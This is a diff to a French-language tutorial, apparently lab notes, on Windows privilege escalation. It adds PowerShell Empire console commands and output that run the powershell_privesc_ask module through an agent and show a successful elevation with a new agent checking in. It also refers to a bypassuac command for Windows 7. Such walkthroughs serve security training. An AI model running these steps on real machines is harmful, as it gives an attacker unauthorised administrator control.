@@ -55,7 +55,7 @@ Une fois cela fait, on doit passer d'une copie de fichier à une exécution de c
 
 ### Usage
 
-Il est donc possible sur notre client windows 7 de passer administrateur avec la commande `bypassuac`
+Il est donc possible sur notre client windows 7 de passer administrateur avec la **commande `bypassuac`**
 
 
 # __Windows 10__
@@ -120,5 +120,18 @@ INFO: Set Agent to 9UPHL3C1
 
 (Empire: usemodule/powershell_privesc_ask) > set Listener http
 INFO: Set Listener to http
-
+(Empire: usemodule/powershell_privesc_ask) > generate
+INFO: Tasked 9UPHL3C1 to run Task 2 
+[*] Task 2 results received
+Job started: BY5RXL
 ```
+
+Puis lorsque la cible validera :
+
+```shell
+[*] Task 2 results received
+[*] Successfully elevated!
+
+[+] New agent FEXA5RKZ checked in
+```
+
